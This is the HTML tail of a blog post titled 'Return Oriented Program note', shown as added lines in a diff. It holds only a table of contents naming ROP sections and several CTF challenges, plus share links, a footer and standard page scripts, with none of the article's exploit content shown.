+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">2.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-ROP"><span class="toc-number">2.1.</span> <span class="toc-text">What is ROP?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-64-ROP"><span class="toc-number">2.2.</span> <span class="toc-text">x86_64 ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-ROP"><span class="toc-number">2.3.</span> <span class="toc-text">x86 ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">3.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwnasm-from-LoTuX-CTF"><span class="toc-number">3.1.</span> <span class="toc-text">Pwnasm from LoTuX CTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo-server"><span class="toc-number">3.2.</span> <span class="toc-text">echo server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop1-sean-Pwn-2"><span class="toc-number">3.3.</span> <span class="toc-text">rop1-sean_Pwn-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stack-Migration"><span class="toc-number">3.3.1.</span> <span class="toc-text">Stack Migration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-number">3.3.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropfu-from-picoCTF"><span class="toc-number">3.4.</span> <span class="toc-text">ropfu from picoCTF</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/29/rop1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/29/rop1/&text=Return Oriented Program note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/29/rop1/&is_video=false&description=Return Oriented Program note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return Oriented Program note&body=Check out this article: http://wha13.github.io/2023/10/29/rop1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/29/rop1/&title=Return Oriented Program note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/29/rop1/&name=Return Oriented Program note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/29/rop1/&t=Return Oriented Program note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
